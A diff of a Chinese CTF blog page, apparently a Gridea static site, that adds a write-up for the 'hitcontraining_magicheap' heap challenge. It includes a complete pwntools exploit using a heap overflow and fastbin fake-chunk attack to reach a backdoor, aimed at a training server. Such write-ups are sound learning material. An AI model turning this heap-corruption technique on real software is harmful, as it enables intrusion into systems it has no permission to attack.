@@ -83,7 +83,7 @@
                         <input id="switch_default" type="checkbox" class="switch_default">
                         <label for="switch_default" class="toggleBtn"></label>
             </div>
-            <form id="gridea-search-form" data-update="1599119293082" action="/search/index.html">
+            <form id="gridea-search-form" data-update="1599235908777" action="/search/index.html">
                 <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
             </form>
         </div>
@@ -102,7 +102,7 @@
                         <!--zh-->
                         <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
                     </div>
-                    <form id="gridea-search-form" data-update="1599119293082" action="/search/index.html">
+                    <form id="gridea-search-form" data-update="1599235908777" action="/search/index.html">
                         <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
                     </form>
                     <!--en-->
@@ -178,9 +178,9 @@
                                 Date: <a href="#">2020-08-25</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">8.3
+                                    href="#">10.3
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">1729</a></span>
+                                    <span class="post-words">words:<a href="#">2150</a></span>
                                     
                                         <span class="post-category">
                                 Category:
@@ -456,6 +456,91 @@ close(1) close(2)是关闭了将程序的输出显示到屏幕上，并且关闭
 <img src="https://l3mon629.github.io/post-images/1599046852432.png" alt="" loading="lazy"><br>
 可以看到我们其实已经拿到了shell，那么我们直接重定向就好 exec 1&gt;&amp;0<br>
 不需要exp 直接nc就好</p>
+<h2 id="hitcontraining_magicheap">hitcontraining_magicheap</h2>
+<h3 id="逆向">逆向</h3>
+<p>main函数，发现框起来的地方有些可疑<br>
+<img src="https://l3mon629.github.io/post-images/1599231918531.png" alt="" loading="lazy"><br>
+点开函数，发现有后门<br>
+<img src="https://l3mon629.github.io/post-images/1599231931909.png" alt="" loading="lazy"><br>
+创建堆块<br>
+<img src="https://l3mon629.github.io/post-images/1599231938548.png" alt="" loading="lazy"><br>
+编辑堆块，存在漏洞，可以自定义堆块编辑的大小（老漏洞了<br>
+<img src="https://l3mon629.github.io/post-images/1599231974769.png" alt="" loading="lazy"><br>
+删除堆块，🈚️UAF<br>
+<img src="https://l3mon629.github.io/post-images/1599231989387.png" alt="" loading="lazy"></p>
+<p>因为没有show函数之类的，所以很难泄漏信息，正好程序没开pie，干脆直接利用后门，想办法在magic附近伪造chunk<br>
+<img src="https://l3mon629.github.io/post-images/1599232826812.png" alt="" loading="lazy"></p>
+<p><img src="https://l3mon629.github.io/post-images/1599232966505.png" alt="" loading="lazy"><br>
+find_fake_fast永远滴神！！</p>
+<h3 id="exp">exp</h3>
+<p>环境可能出问题了，同样的exp打了十次才通，本地是通了，远程也终于通了</p>
+<pre><code>from pwn import *
+
+context.log_level = 'debug'
+
+local = 0
+if local == 1:
+    p = process('./magicheap')
+else:
+    p = remote('node3.buuoj.cn',25199)
+
+def add(size,content):
+    p.sendlineafter('Your choice :','1')
+    p.sendlineafter('Size of Heap :',str(size))
+    p.sendafter('Content of heap:',content)
+
+def edit(index,size,content):
+    p.sendlineafter('Your choice :','2')
+    p.sendlineafter('Index :',str(index))
+    p.sendlineafter('Size of Heap :',str(size))
+    p.sendafter('Content of heap:', content)
+
+def free(index):
+    p.sendlineafter('Your choice :', '3')
+    p.sendlineafter('Index :',str(index))
+
+print(&quot;===== 第一种思路： 不管后门，直接fastbin attack 打mallochook ======&quot;)
+print(&quot;======= 但是没有show函数，我们无法泄漏libc ======&quot;)
+print(&quot;所以综上考虑，要不我们还是利用后门好了-.-||&quot;)
+'''
+add(0x10,b'A' * 8)  #chunk0
+add(0x30,b'a' * 8)  #chunk1
+free(1)
+fake_chunk = 0x602062
+payload = 0x10 * b'A' + p64(0) + p64(0x41) + p64(fake_chunk)
+print(&quot;payload length:&quot; + str(len(payload)))
+#print(p.recv())
+#edit(0,41,payload)
+'''
+
+print(&quot;double free搞一下&quot;)
+
+add(0x30,'A')   #chunk0
+add(0x60,'B')   #chunk1
+
+fake_chunk = 0x60207D
+
+free(1)
+
+payload = 0x30 * b'A' + p64(0) + p64(0x71) + p64(fake_chunk)
+
+print(&quot;这里不知道哪里错了，编辑功能总是上不去，可能是函数内部编写的有问题，懒得看了-.-&quot;)
+
+p.sendline('2')
+p.sendline('0')
+p.sendline(str(len(payload)))
+p.send(payload)
+
+#edit(0,len(payload),payload)
+
+add(0x60,p64(fake_chunk))
+
+payload = 0x13 * b'A' + p64(0x1306)
+add(0x60,payload)
+
+p.interactive()
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://l3mon629.github.io/post-images/1599235870287.png" alt="" loading="lazy"></figure>
 
                         </div>
                         
@@ -468,6 +553,12 @@ close(1) close(2)是关闭了将程序的输出显示到屏幕上，并且关闭
 <li><a href="#ciscn_2019_es_1">ciscn_2019_es_1</a></li>
 <li><a href="#%E4%B8%B4%E6%97%B6%E5%8A%A0%E4%B8%AA%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cstring">临时加个攻防世界：string</a></li>
 <li><a href="#wustctf2020_closed">wustctf2020_closed</a></li>
+<li><a href="#hitcontraining_magicheap">hitcontraining_magicheap</a>
+<ul>
+<li><a href="#%E9%80%86%E5%90%91">逆向</a></li>
+<li><a href="#exp">exp</a></li>
+</ul>
+</li>
 </ul>
 </li>
 </ul>
@@ -501,8 +592,8 @@ close(1) close(2)是关闭了将程序的输出显示到屏幕上，并且关闭
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
                                                         <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/buu-pwn1/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/buu-pwn1/&sharesource=qzone&title=buu-pwn(1)&pics=https://l3mon629.github.io/images/avatar.png?v=1599119293082&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/buu-pwn1/&sharesource=weibo&title=buu-pwn(1) + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1599119293082 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/buu-pwn1/&sharesource=qzone&title=buu-pwn(1)&pics=https://l3mon629.github.io/images/avatar.png?v=1599235908777&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/buu-pwn1/&sharesource=weibo&title=buu-pwn(1) + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1599235908777 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -606,7 +697,7 @@ close(1) close(2)是关闭了将程序的输出显示到屏幕上，并且关闭
                     CheckVersion();
                     
                     var newDate = new Date();
-                    newDate.setTime(1599119293082);
+                    newDate.setTime(1599235908777);
                     console.log(" Blog Update Time: " + newDate.toLocaleDateString());
                     console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                 </script>
